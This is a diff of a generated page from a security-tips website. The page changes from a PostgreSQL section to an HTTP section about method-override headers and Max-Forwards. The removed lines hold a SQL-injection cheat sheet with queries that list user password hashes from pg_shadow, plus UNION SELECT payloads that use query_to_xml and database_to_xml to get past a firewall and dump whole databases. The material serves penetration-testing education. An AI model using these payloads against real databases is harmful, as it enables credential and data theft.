@@ -7,22 +7,22 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="search" href="/opensearch.xml" type="application/opensearchdescription+xml" title="Security Tips">
 
-  
-  
+  <meta name="description" content="Common misconfiguration on HTTP servers and applications">
+  <meta name="keywords" content="HTTP, header, web">
 
   <meta name="author" content="Vincent D. (@vincd)">
   <link rel="shortcut icon" href="../img/favicon.ico">
   <title>
-    PostgreSQL - Security Tips
+    HTTP - Security Tips
     
   </title>
   <link rel="stylesheet" href="../css/style.css" type="text/css" />
   
   <script>
     // Current page data
-    var mkdocs_page_name = "PostgreSQL";
-    var mkdocs_page_input_path = "postgresql.md";
-    var mkdocs_page_url = "/postgresql/";
+    var mkdocs_page_name = "HTTP";
+    var mkdocs_page_input_path = "http.md";
+    var mkdocs_page_url = "/http/";
   </script>
    
 </head>
@@ -182,22 +182,11 @@
           
           <li class="bold">
             
-    <span class="section-link active">SQL</span>
+    <span class="section-link ">SQL</span>
     <ul>
-                <li class="active">
+                <li class="">
                     
-    <a class="section-link" href="./">PostgreSQL</a>
-    <ul>
-            
-    
-    <ul>
-    
-        <li><a class="" href="#injection-sql">Injection SQL</a></li>
-    
-    </ul>
-    
-
-    </ul>
+    <a class="section-link" href="../postgresql/">PostgreSQL</a>
                 </li>
     </ul>
           </li>
@@ -274,7 +263,7 @@
           
           <li class="bold">
             
-    <span class="section-link ">Misc</span>
+    <span class="section-link active">Misc</span>
     <ul>
                 <li class="">
                     
@@ -288,9 +277,22 @@
                     
     <a class="section-link" href="../git/">Git</a>
                 </li>
-                <li class="">
+                <li class="active">
                     
-    <a class="section-link" href="../http/">HTTP</a>
+    <a class="section-link" href="./">HTTP</a>
+    <ul>
+            
+    
+    <ul>
+    
+        <li><a class="" href="#http-method-override">HTTP method override</a></li>
+    
+        <li><a class="" href="#max-forward">Max forward</a></li>
+    
+    </ul>
+    
+
+    </ul>
                 </li>
                 <li class="">
                     
@@ -337,83 +339,27 @@
         <div role="main">
           <div class="section">
             
-              <h1></h1>
-              <h1 id="postgresql">PostgreSQL</h1>
-<h2 id="injection-sql">Injection SQL</h2>
-<h3 id="cheat-sheet">Cheat Sheet</h3>
-<p>Here is some userfull commands to deal with SQL injection:</p>
-<table>
-<thead>
-<tr>
-<th align="left">Detail</th>
-<th align="left">SQL command</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td align="left">Version</td>
-<td align="left"><code>SELECT version()</code></td>
-</tr>
-<tr>
-<td align="left">List Users</td>
-<td align="left"><code>SELECT usename FROM pg_user</code></td>
-</tr>
-<tr>
-<td align="left">List users and passwords</td>
-<td align="left"><code>SELECT usename, passwd FROM pg_shadow</code></td>
-</tr>
-<tr>
-<td align="left">List Privileges</td>
-<td align="left"><code>SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user</code></td>
-</tr>
-<tr>
-<td align="left">Database Name</td>
-<td align="left"><code>SELECT current_database()</code></td>
-</tr>
-<tr>
-<td align="left">List databases</td>
-<td align="left"><code>SELECT datname FROM pg_database</code></td>
-</tr>
-<tr>
-<td align="left">List tables</td>
-<td align="left"><code>SELECT table_name FROM information_schema.tables</code></td>
-</tr>
-<tr>
-<td align="left">List columns</td>
-<td align="left"><code>SELECT column_name FROM information_schema.columns WHERE table_name='data_table'</code></td>
-</tr>
-<tr>
-<td align="left">Select nth row</td>
-<td align="left"><code>SELECT ... LIMIT 1 OFFSET {n}</code></td>
-</tr>
-<tr>
-<td align="left">Concatenate strings in the same row</td>
-<td align="left"><code>SELECT CONCAT(username, ', ', passwd) FROM pg_shadow</code></td>
-</tr>
-<tr>
-<td align="left">Concatenate column</td>
-<td align="left"><code>SELECT string_agg(column_name, ', ') FROM information_schema.columns WHERE table_name='data_table'</code></td>
-</tr>
-</tbody>
-</table>
-<h3 id="xml-functions">XML functions</h3>
-<h4 id="query_to_xml-and">query_to_xml and</h4>
-<p>The following functions map the contents of relational tables to XML values:</p>
-<pre><code class="language-sql">query_to_xml(query text, nulls boolean, tableforest boolean, targetns text)
-table_to_xml(tbl regclass, nulls boolean, tableforest boolean, targetns text)
-cursor_to_xml(cursor refcursor, count int, nulls boolean, tableforest boolean, targetns text)
+              <h1>HTTP</h1>
+              <h2 id="headers">Headers</h2>
+<h3 id="http-method-override">HTTP method override</h3>
+<p>The headers <code>X-HTTP-Method</code>, <code>X-HTTP-Method-Override</code> or <code>X-Method-Override</code> are
+used to override the real HTTP method on request.
+The reverse proxy may check the real method and passes the request to the
+application which uses the header value as method.</p>
+<pre><code class="language-none">GET / HTTP/1.1
+Host: ...
+X-HTTP-Method: TRACE
+...
 </code></pre>
-<p>With <code>query_to_xml</code> you can bypass WAF and exfiltrate the query results in a
-single string:</p>
-<pre><code class="language-sql">... UNION SELECT '1', '2', query_to_xml('select * from pg_user', true, true, ''), '4', ...
-</code></pre>
-<h4 id="database_to_xml">database_to_xml</h4>
-<p>The following function may be available and returns the entire current database:</p>
-<pre><code class="language-sql">database_to_xml(nulls boolean, tableforest boolean, targetns text)
-</code></pre>
-<p>The exploitation is as follow. Be careful the process may timeout or DOS the
-server:</p>
-<pre><code class="language-sql">... UNION SELECT '1', '2', database_to_xml(true, true, ''), '4', ...
+<h3 id="max-forward">Max forward</h3>
+<p>The <code>Max-Forwards</code> header provides a mechanism to limit the number of times that
+the request is forwarded by proxies. This can be useful when the client is
+attempting to trace a request that appears to be failing or looping mid-chain
+(cf <a href="https://tools.ietf.org/html/rfc7231#section-5.1.2" target="_blank">section-5.1.2</a>).</p>
+<pre><code class="language-none">GET / HTTP/1.1
+Host: ...
+Max-Forwards: 2
+...
 </code></pre>
             
           </div>
@@ -433,10 +379,10 @@ server:</p>
     <span class="rst-current-version" data-toggle="rst-current-version">
       
       
-        <span><a href="../nginx/" style="color: #fcfcfc;">&laquo; Previous</a></span>
+        <span><a href="../git/" style="color: #fcfcfc;">&laquo; Previous</a></span>
       
       
-        <span style="margin-left: 15px"><a href="../cve/CVE-2016-3714/" style="color: #fcfcfc">Next &raquo;</a></span>
+        <span style="margin-left: 15px"><a href="../iscsi/" style="color: #fcfcfc">Next &raquo;</a></span>
       
     </span>
 </div>
